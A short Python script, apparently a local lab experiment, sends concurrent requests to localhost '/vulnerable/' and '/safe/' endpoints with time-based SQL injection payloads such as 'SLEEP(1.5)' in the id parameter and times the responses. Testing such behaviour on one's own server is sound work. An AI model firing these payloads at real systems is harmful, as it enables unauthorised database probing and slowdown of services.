import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import time

# sleep time is 1.5 secs, 30 requests. result is 74 seconds total, 2.5 secs each requests
import concurrent.futures
import requests
import threading
import time


thread_local = threading.local()
sites_low_sleep, sites_high_sleep = list(),list()

def get_site(url):
    with requests.get(url) as response:
        print(f"{url}")


def get_all_sites(sites):
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(get_site, sites)


for h in range(20):
    sites_high_sleep.append("http://localhost:5000/vulnerable/{}/page?id=SLEEP(1.5)".format(h))
start_time = time.time()
get_all_sites(sites_high_sleep)
duration = time.time() - start_time
print(f"Got {len(sites_high_sleep)} in {duration} seconds")



for h in range(20):
    sites_low_sleep.append("http://localhost:5000/vulnerable/{}/page?id=SLEEP(0.01)".format(h))
start_time = time.time()
get_all_sites(sites_low_sleep)
duration = time.time() - start_time
print(f"Got {len(sites_low_sleep)} in {duration} seconds")


sites_safe = list()
for h in range(10):
    sites_safe.append("http://localhost:5000/safe/{}/page?id=SLEEP(1000)".format(h))
start_time = time.time()
get_all_sites(sites_safe)
duration = time.time() - start_time
print(f"Got {len(sites_safe)} in {duration} seconds")